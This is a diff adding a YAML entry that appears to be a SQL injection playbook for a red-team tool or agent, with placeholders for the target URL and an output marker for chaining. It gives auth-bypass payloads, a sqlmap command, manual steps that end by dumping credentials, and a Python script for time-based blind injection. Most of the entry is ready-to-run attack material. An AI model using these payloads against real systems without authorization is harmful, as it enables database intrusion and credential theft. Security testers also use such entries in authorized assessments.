@@ -1,0 +1,45 @@
+metadata:
+  id: cwe-89-sqli
+  name: SQL Injection
+  cwe_ids:
+  - CWE-89
+  target_type: generic
+  tags:
+  - sqli
+  - sql-injection
+  - union-select
+  - blind
+  - time-blind
+  - auth-bypass
+  author: co-redteam
+  severity: critical
+content: 'Quick test: '' OR ''1''=''1''-- / " OR "1"="1
+
+  Automated: sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
+
+
+  Manual injection process:
+
+  1. Identify injection point (params/Headers/Cookie)
+
+  2. Determine DB type (error message diff / comment syntax / built-in functions)
+
+  3. Count columns: ORDER BY 1,2,3...
+
+  4. Extract DB name / table name / column name
+
+  5. Dump sensitive data (credentials/flags)
+
+
+  Time-based blind example:
+
+  import requests,urllib3,time; urllib3.disable_warnings(); base=''{TARGET_BASE_URL}''
+
+  payload="'' AND IF(1=1,SLEEP(5),0)-- "
+
+  start=time.time(); r=requests.get(f''{base}{ENDPOINT}?id={payload}'', verify={VERIFY_FLAG});
+  elapsed=time.time()-start
+
+  print(''###CHAIN_OUTPUT###''+str({''elapsed'':elapsed,''is_blind'':elapsed>4}))
+
+  '
